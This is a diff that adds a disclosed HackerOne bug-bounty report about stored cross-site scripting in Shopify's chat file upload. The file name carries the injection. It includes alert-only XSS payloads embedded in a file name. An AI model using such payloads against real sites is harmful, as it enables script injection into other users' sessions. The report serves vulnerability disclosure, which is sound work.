@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/81757
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/dz_samir
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:02.09.2015 16:43:15
+
+Summary:
+
+hello 
+login in the chat  and upload file with Payload name (code injection)
+like  <img src="c" onerror=alert(1)>   the code html will execute 
+
+<span>You are not allowed to upload '<img src="c" onload="alert(1)">' files, allowed types: jpg, jpeg, gif, png</span>
+
+
+
+Hadji Samir
